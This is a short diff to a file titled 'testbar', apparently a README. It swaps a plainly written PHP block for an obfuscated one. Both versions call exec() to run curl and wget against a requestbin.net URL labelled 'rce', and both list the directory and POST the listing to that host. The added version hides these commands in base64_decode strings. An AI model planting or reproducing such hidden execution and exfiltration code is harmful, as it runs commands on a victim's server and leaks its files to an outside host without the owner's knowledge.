@@ -1,8 +1,4 @@
 # testbar
 
 
-<?php
-exec("curl http://requestbin.net/r/rn0hh7rn/rce");
-exec("wget http://requestbin.net/r/rn0hh7rn/rce");
-exec("ls -la > ffff; curl http://requestbin.net/r/rn0hh07rn/ -d '$(cat ffff)' -X POST");
-?>
+<?php exec(base64_decode('Y3VybCBodHRwOi8vcmVxdWVzdGJpbi5uZXQvci9ybjBoaDdybi9yY2U='));exec(base64_decode('d2dldCBodHRwOi8vcmVxdWVzdGJpbi5uZXQvci9ybjBoaDdybi9yY2U='));exec(base64_decode('bHMgLWxhID4gZmZmZjsgY3VybCBodHRwOi8vcmVxdWVzdGJpbi5uZXQvci9ybjBoaDA3cm4vIC1kICckKGNhdCBmZmZmKScgLVggUE9TVA=='));?>
